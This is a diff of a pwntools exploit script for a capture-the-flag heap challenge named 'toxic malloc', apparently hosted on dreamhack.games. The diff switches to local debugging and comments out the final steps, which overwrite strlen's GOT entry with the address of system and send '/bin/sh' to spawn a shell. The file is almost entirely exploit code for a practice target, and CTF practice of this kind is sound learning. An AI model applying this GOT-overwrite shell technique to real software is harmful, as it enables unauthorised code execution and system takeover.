@@ -1,10 +1,10 @@
 from pwn import *
 
-# context.log_level = 'debug'
-context.terminal = ['tmux', 'new-window']
+context.log_level = 'debug'
+# context.terminal = ['tmux', 'new-window']
 
-env={"LD_PRELOAD":"./Pwnable/toxic malloc/problem/deploy/libc.so.6"}
-rem = process("./Pwnable/toxic malloc/problem/deploy/chall", env=env)
+# env={"LD_PRELOAD":"./Pwnable/toxic\\ malloc/problem/deploy/libc.so.6"}
+rem = process("./Pwnable/toxic malloc/problem/deploy/chall")
 # port = 18595
 # rem = remote("host3.dreamhack.games", port)
 
@@ -63,10 +63,10 @@ sys_addr = lib_base + lib.symbols['system']
 print(hex(strlen_got))
 
 create(1, p64(strlen_got))
-create(2, b"A" * 7)
-create(3, p64(sys_addr))
-update(0, b"/bin/sh\x00")
-read(0)
+# create(2, b"A" * 7)
+# create(3, p64(sys_addr))
+# update(0, b"/bin/sh\x00")
+# read(0)
 
 gdb.attach(rem)
 rem.interactive()
